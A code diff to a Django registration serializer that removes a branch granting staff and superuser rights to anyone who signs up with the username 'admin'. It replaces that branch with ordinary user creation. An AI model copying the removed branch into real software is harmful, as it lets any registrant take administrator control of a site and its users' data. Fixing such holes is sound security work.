@@ -23,24 +23,9 @@ class RegisterSerializer(serializers.ModelSerializer):
         return attrs
     
     def create(self, validated_data):
-        username = validated_data['username']
-        email = validated_data['email']
-        password = validated_data['password']
-
-        if username == 'admin':
-            user = User.objects.create_user(
-                username=username,
-                email=email,
-                password=password,
-                is_staff=True,
-                is_superuser=True
-            )
-            user.set_password(validated_data['password'])
-            user.save()
-        else:
-            user = User(**validated_data)
-            user.set_password(validated_data['password'])
-            user.save()
+        user = User(**validated_data)
+        user.set_password(validated_data['password'])
+        user.save()
         
         return user
 
